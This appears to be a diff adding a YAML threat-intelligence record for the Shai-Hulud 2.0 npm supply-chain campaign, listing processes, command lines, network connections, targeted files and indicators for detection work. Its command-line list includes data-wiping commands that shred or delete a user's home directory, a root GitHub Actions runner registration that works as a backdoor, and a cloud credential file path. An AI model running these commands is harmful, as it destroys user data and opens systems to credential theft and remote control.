@@ -1,0 +1,65 @@
+description: Shai-Hulud 2.0 campaign involves supply chain compromise of npm packages
+  to harvest credentials and sensitive configuration data.
+malware_families:
+- Shai-Hulud
+TTPs:
+  processes:
+  - npm
+  - node
+  - cmd.exe
+  - powershell.exe
+  - bash
+  - sh
+  - dash
+  - tar
+  - curl
+  - config.sh
+  - Runner.Listener
+  - TruffleHog
+  commandline:
+  - npm install shai-hulud
+  - node setup_bun.js
+  - child_process.exec()
+  - mkdir -p $HOME/.dev-env
+  - curl -o actions-runner-linux-x64-2.330.0.tar.gz -L https://github.com/actions/runner/releases/download/...tar
+    xzf ./actions-runner-linux-x64-2.330.0.tar.gz
+  - RUNNER_ALLOW_RUNASROOT=1 ./config.sh --url https://github.com/${owner}/${repoName}
+    --unattended --token ${runnerToken} --name "SHA1HULUD"
+  - RM actions-runner-linux-x64-2.330.0.tar.gz
+  - del /F /Q /S "%USERPROFILE%\\*" && for /d %%i in ("%USERPROFILE%\\*") do rd /S
+    /Q "%%i" & cipher /W:%USERPROFILE%
+  - find "$HOME" -type f -writable -user "$(id -un)" -print0 | xargs -0 -r shred -uvz
+    -n 1 && find "$HOME" -depth -type d -empty -delete
+  powershell: []
+  scripting_engine:
+  - JavaScript
+  - Bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - node -> registry.npmjs.org
+  - node -> github.com/actions/runner/releases/download
+  - node -> storage.googleapis.com
+  - node -> gcp
+  file_activity:
+  - ~/.npm/_cacache/
+  - ~/.dev-env/
+  - /.config/gcloud/application_default_credentials.json
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - registry.npmjs.org
+  - github.com
+  - storage.googleapis.com
+  - gcp
+  urls:
+  - https://github.com/actions/runner/releases/download/...tar.gz
+  - https://bun.sh/install
+authors:
+- SIMKRA
+reference: https://detect.fyi/shai-hulud-2-0-campaign-be390e502f28?source=rss----d5fd8f494f6a---4
+date_of_publication: January 12, 2026
+file_creation_date: January 14, 2026
